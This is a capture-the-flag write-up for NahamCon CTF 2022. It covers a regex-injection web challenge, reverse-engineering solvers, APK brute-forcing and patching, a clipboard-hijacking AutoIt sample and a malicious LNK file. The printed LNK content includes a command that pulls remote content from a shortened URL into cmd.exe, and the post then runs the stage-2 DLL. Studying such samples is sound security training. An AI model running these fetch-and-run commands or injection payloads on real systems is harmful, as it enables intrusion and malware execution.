---
title: NahamCon CTF 2022
date: 2022-05-01 00:00:00 +0800
categories: [CTF, writeup]
tags: [mobile, malware, reverse, miscellaneous, steganography, web]     # TAG names should always be lowercase
toc: true
image:
  src: /assets/img/posts/nahamctf/naham_banner.png
  width: 500   # in pixels
  height: 200   # in pixels
  alt: naham banner
---

# Web
## Personnel

![challange-description](/assets/img/posts/nahamctf/personnel_des.jpeg)
_challange description_

```python
flag = open("flag.txt").read()
users = open("users.txt").read()

users += flag


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("lookup.html")
    if request.method == "POST":
        name = request.form["name"]
        setting = int(request.form["setting"])
        if name:
            if name[0].isupper():
                name = name[1:]

        results = re.findall(r"[A-Z][a-z]*?" + name + r"[a-z]*?\n", users, setting)
        results = [x.strip() for x in results if x or len(x) > 1]

        return render_template("lookup.html", passed_results=True, results=results)
```
{: file="app.py" }


The name is concatenated and used as regex for search for a pattern
so by entering the name as `|flag{.*}|`

It will return all the strings any string starting with a capital letter followed by any number of small letters or flag format or word consisting of small letters


![challange-flag](/assets/img/posts/nahamctf/personnel_flag.jpeg)
_query results_

> flag{f0e659b45b507d8633065bbd2832c627}
{: .prompt-info }


# Reverse
## babyrev

![challange-description](/assets/img/posts/nahamctf/babyrev_des.jpeg)
_challange description_


looking at the elf file

```c
   v6 = __readfsqword(0x28u);
  printf("Welcome to baby's first rev! :>\nPlease enter your username: ");
  __isoc99_scanf("%s", s1);
  printf("Please enter your password: ");
  __isoc99_scanf("%s", v5);
  if ( strcmp(s1, "bossbaby") )
  {
    printf("%s? I don't know you... stranger danger...", s1);
    exit(0);
  }
  puts("You're almost there!");
  if ( (unsigned int)sub_12AD(v5) == 38 )
    printf("You're boss baby!");
```
{: filename="main"}


username is `babyboss` and the password is passed to Subroutine `sub_12AD`

The important part of this function is a call to function `sub_1208 + 1`
then it compares the data stored at `dword_4020` with the password

```c
 ((void (__fastcall *)())((char *)&sub_1208 + 1))();
  for ( i = 0; ; ++i )
  {
    v4 = i;
    if ( v4 >= strlen(s) )
      break;
    if ( dword_4020[i] == *((_DWORD *)v11 + i) )
      ++v8;
  }
```
{: filename="sub_12AD"}

this address wasn't recognized as code so you have to make a function at this location

```c
__int64 __fastcall sub_120D(const char *a1, __int64 a2)
{
  int i; // [rsp+1Ch] [rbp-14h]

  for ( i = 0; i < strlen(a1); ++i )
    *(_DWORD *)(4LL * i + a2) = (a1[i] << ((char)i % 7)) + i * i;
  return a2;
}
```
{: filename="sub_120D"}


extract bytes at `dword_4020` and reverse the encryption done by `sub_120D`

```python
arr =  [0x66, 0x0D9, 0x188, 0x341, 0x7C0, 0x6F9, 0x18A4, 0x95, 0x10A,
 0x1D5, 0x37C, 0x3A9, 0x7B0, 0x1969, 0x127, 0x1A3, 0x1C4, 0x2B9,
 0x754, 0x889, 0x0F50, 0x1F0, 0x254, 0x2D9, 0x558, 0x571, 0x924,
 0x1019, 0x342, 0x3AD, 0x508, 0x6E9, 0x0A30, 0x10E1, 0x1284,
 0x500, 0x5D2, 0x74D,]

flag = ''
for i in range(len(arr)):
    temp = arr[i] - (i * i)
    temp = temp >> (i % 7)
    flag += chr(temp)


print(flag)
```
{: file="solver.py" }

> flag{7bdeac39cca13a97782c04522aece87a}
{: .prompt-info }


# Mobile
## OTP Vault

![challange-description](/assets/img/posts/nahamctf/otp_vault_des.jpeg)
_challange description_

opening APK at JADX-GUI and looking at the main activity

```java
package com.otpvault;

import com.facebook.react.ReactActivity;
import com.facebook.react.ReactActivityDelegate;
import com.facebook.react.ReactRootView;

/* loaded from: classes.dex */
public class MainActivity extends ReactActivity {
    @Override // com.facebook.react.ReactActivity
    protected String getMainComponentName() {
        return "OTPVault";
    }

```
{: file="MainActivity" }

the main activity inherits from `ReactActivity` this means the apk build using react-native

running apktool to extract all files from APK
```shell
apktool d OTPVault.apk
```
{: .nolineno }

looking at the code at `OTPVault.ap/assets/index.android.bundle` a search for otp then copy a few lines and prettify it

```javascript
function O() {
    var n;
    (0, e.default)(this, O);
    for (var o = arguments.length, u = new Array(o), l = 0; l < o; l++) u[l] = arguments[l];
    return (n = b.call.apply(b, [this].concat(u))).state = {
        output: 'Insert your OTP to unlock your vault',
        text: ''
    }, n.s = 'JJ2XG5CIMFRWW2LOM4', n.url = 'http://congon4tor.com:7777', n.token = '652W8NxdsHFTorqLXgo=',

    n.getFlag = function() {
        var e, o;
        return t.default.async(function(u) {
            for (;;) switch (u.prev = u.next) {
                case 0:
                    return u.prev = 0, e = {
                        headers: {
                            Authorization: 'Bearer KMGQ0YTYgIMTk5Mjc2NzZY4OMjJlNzAC0WU2DgiYzE41ZDwN'
                        }
                    }, u.next = 4, t.default.awrap(p.default.get(n.url + "/flag", e));
                case 4:
                    o = u.sent, n.setState({
                        output: o.data.flag
//                     }), u.next = 12;
```
{: file="javascript" }

sending the same request using postman

![postman_request](/assets/img/posts/nahamctf/postman.jpeg)
_postman request_

> flag{5450384e093a0444e6d3d39795dd7ddd}
{: .prompt-info }



## Secure Notes

![challange-description](/assets/img/posts/nahamctf/secure_note_des.jpeg)
_challange description_

opening the APK in JADX-GUI and looking at login activity

the APK takes a pin code and repeats it 4 times then use it as a key for AES encryption to decrypt the database

```java
public void onClick(View view) {
    try {
        C0940d.m156k(this.f2153b.getText().toString() + this.f2153b.getText().toString() + this.f2153b.getText().toString() + this.f2153b.getText().toString(), new File(this.f2154c.getPath()), new File(LoginActivity.this.getCacheDir(), "notes.db"));
        LoginActivity.this.startActivity(this.f2155d);
    } catch (C0947a unused) {
        Toast.makeText(LoginActivity.this.getApplicationContext(), "Wrong password", 0).show();
    }
}


public static void m156k(String str, File file, File file2) {
    try {
        SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(2, secretKeySpec);
        FileInputStream fileInputStream = new FileInputStream(file);
        byte[] bArr = new byte[(int) file.length()];
        fileInputStream.read(bArr);
        byte[] doFinal = cipher.doFinal(bArr);
        FileOutputStream fileOutputStream = new FileOutputStream(file2);
        fileOutputStream.write(doFinal);
        fileInputStream.close();
        fileOutputStream.close();
    } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) {
        throw new C0947a("Error encrypting/decrypting file", e);
    }
}
```

writing script to brute force all keys and save the decrypted File


```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.WeakHashMap;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.nio.file.Path;
import java.nio.file.Paths;


public class Main {
    public static void main(String args[]) {

        for (int i1 = 0; i1 < 10; i1++) {
            for (int i2 = 0; i2 < 10; i2++) {
                for (int i3 = 0; i3 < 10; i3++) {
                    for (int i4 = 0; i4 < 10; i4++) {
                        String code = Integer.toString(i1) + Integer.toString(i2) + Integer.toString(i3) + Integer.toString(i4);
                        String str = code + code + code + code;
                        String file = "./db.encrypted";
                        String file2 = "./" + code + ".db";
                        // System.out.println("Trying value: " + code);
                        try {
                            SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), "AES");
                            Cipher cipher = Cipher.getInstance("AES");
                            cipher.init(2, secretKeySpec);
                            // FileInputStream fileInputStream = new FileInputStream(file);
                            // byte[] bArr = new byte[(int) file.length()];
                            // fileInputStream.read(bArr);

                            Path path = Paths.get("./db.encrypted");
                            byte[] bArr = java.nio.file.Files.readAllBytes(path);
                            // System.out.println("Found value: " + bArr.length);
                            byte[] doFinal = cipher.doFinal(bArr);
                            FileOutputStream fileOutputStream = new FileOutputStream(file2);
                            fileOutputStream.write(doFinal);
                            // fileInputStream.close();
                            fileOutputStream.close();
                            System.out.println("Found value: " + code);
                            break;
                        } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) {
                            // System.out.println(e);
                        }


                    }
                }
            }
        }

    }
}
```
{: file="Main.java" }

this script will generate many files and by running file command only one of them will be defined as JSON with correct pin `5732`


> flag{a5f6f2f861cb52b98ebedcc7c7094354}
{: .prompt-info }

## Click Me

![challange-description](/assets/img/posts/nahamctf/click_me_des.jpeg)
_challange description_

opening the apk in JADX-GUI and looking at the Main activity


```java

public final void cookieViewClick(View view) {
    int i = this.CLICKS + 1;
    this.CLICKS = i;
    if (i >= 13371337) {
        this.CLICKS = 13371337;
    }
    ((TextView) findViewById(C0574R.C0577id.cookieCount)).setText(String.valueOf(this.CLICKS));
}

public final void getFlagButtonClick(View view) {
    Intrinsics.checkNotNullParameter(view, "view");
    if (this.CLICKS == 99999999) {
        Toast.makeText(getApplicationContext(), getFlag(), 0).show();
        return;
    }
    Toast.makeText(getApplicationContext(), "You do not have enough cookies to get the flag", 0).show();
}
```
it is not possible to get a 99999999 click

using apktool

```shell
apktool d click_me.apk
```
{: .nolineno }

and change the value 99999999 to 5 at smali bytecode and set `extractNativeLibs` as `true` at `AndroidManifest`

then compile the patched APK

```shell
apktool.exe b click_me/ -o flag.apk
```
{: .nolineno }

then create signature key and sign the APK to run it

```shell
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore flag.apk alias_name
```
{: .nolineno }

run apk, click at the cookie 5 time at click get flag button


>flag{849d9e5421c59358ee4d568adebc5a70)
{: .prompt-info }


# Malware
## Otto's It

![challange-description](/assets/img/posts/nahamctf/otto_it.jpeg)
_challange description_

DetectItEasy identify the file as an AutoIt script

![DetectItEasy](/assets/img/posts/nahamctf/autoit_die.jpeg)
_DetectItEasy_

using AutoIt extractor to get the script

![autoit-extractor](/assets/img/posts/nahamctf/autoit_extractor.jpeg)
_autoit extractor_

Analyzing the script

The script is obsticated but from the description you can think about clip board as malware might change the value copied to mactch the attacker wallet address and thatis how he steal the money

Seach for Clipboard you will find a function read clipBoard and compare it to some varibles
but thier value isn't clear
so i modified the code after each variable to pop up a message box with it value
ex
```autoit
MsgBox(0,"",$ckkgdnbk_rowmg_zlwyizjakm)

MsgBox(0,"",$var_2025)

MsgBox(0,"",$var_2571)

MsgBox(0,"",$rmkily_bsqta)
```

and cmpiled the file and after few message box here is the flag
![flag](/assets/img/posts/nahamctf/autoit_flag.jpeg)
_flag_

>flag{f4bc6d0bfcbf128c97490e392a39842b}
{: .prompt-info }

## USB Drive

![challange-description](/assets/img/posts/nahamctf/usb_drive_des.jpeg)
_challange description_

Open the LNK as a text file
found a lot of empty lines and at the end, this command
appears to fetch some data from a URL

```
 	      	 / V / R 	 C M D < h t t p s : / / t i n y u r l . c o m / a 7 b a 6 m a                              %windir%\System32\cmd.exe                                                                                                                                                                                                                                           % w i n d i r % \ S y s t e m 3 2 \ c m d . e x e                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             %   Õ         wNÁç]N·D.±®Q·Õ      	      1SPSâXFŒL8C»ü&mÎm          .   S - 1 - 5 - 2 1 - 3 9 4 6 0 9 1 4 9 - 2 8 0 1 1 4 6 6 4 8 - 1 9 9 4 9 5 5 9 4 9 - 3 0 0 2           `      X       8nlnh4j         æ('}}C`ðC\iù_d¿qìŒ  %diïæ('}}C`ðC\iù_d¿qìŒ  %diï    
```

the link point to some encoded data
![stage2](/assets/img/posts/nahamctf/usb_stage2.jpeg)
_stage2_

decode it from base 32

![cyberchef](/assets/img/posts/nahamctf/usb_stage2_decode.jpeg)
_base32 cyberchef_

The decoded file is a DLL.

The analysis reveals that DllMain will show the flag at a message box

run the dll
```shell
rundll32.exe stage2.dll,DllMain
```
{: .nolineno }


![flag](/assets/img/posts/nahamctf/usb_flag.jpeg)
_flag_

>flag{0af2873a74cfa957ccb90cef814cfe3d}
{: .prompt-info }

# Miscellaneous
## One Mantissa Please

![challange-description](/assets/img/posts/nahamctf/1_mantissa_plz.jpeg)
_challange description_

from this link [javascripts number type](https://indepth.dev/posts/1139/here-is-what-you-need-to-know-about-javascripts-number-type) `9007199254740992 IS equal to 9007199254740993`

>flag{3a78300a68de2a1210c9e3726c3cb87a}
{: .prompt-info }

## To Be And Not To Be

![challange-description](/assets/img/posts/nahamctf/nan_des.jpeg)
_challange description_

in javascript NaN != NaN

>flag{7ecfb3bf076a6a9635f975fe96ac97fd}
{: .prompt-info }

# Steganography
## Ostrich

![challange-description](/assets/img/posts/nahamctf/ostrich.jpeg)
_challange description_

The script will load the image and loop over each char of the flag to find a random pixel and multiply the char of the flag with the third color value of the pixel the store then result in the pixel and save the image

In the end, all images are converted to one apng image

Writing a script that will loop over each frame of the apng and found the different pixel and get the flag

```python
import imageio
from PIL import Image, GifImagePlugin
from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l
import random
from apng import APNG

filenames = []
flag = 'x' * 32

orig_filename = "ostrich.jpg"
orig_image = Image.open(orig_filename)

pixels = orig_image.load()

width, height = orig_image.size

images = []

flag = ''

im = APNG.open("result.apng")
i = 0
for frame, control in im.frames:
    frame.save("frame.png")
    png = Image.open("frame.png")

    png_pixels = png.load()

    for x in range(width):
        for y in range(height):
            pixel = list(png.getpixel((x, y)))
            if pixel[2] == 0:
                if pixel[0] != orig_image.getpixel((x,y))[0]:
                    b = [pixel[0]]
                    if pixel[1] != orig_image.getpixel((x,y))[1]:
                        b.append(pixel[1])

                    l = b2l(bytes(b))
                    flag += chr(int(l / orig_image.getpixel((x,y))[2]))

print(flag)
```
{: file="solver.py" }

>flag{d3a5b80f96a3ce0dd0aedbefbc6b1fa1}
{: .prompt-info }
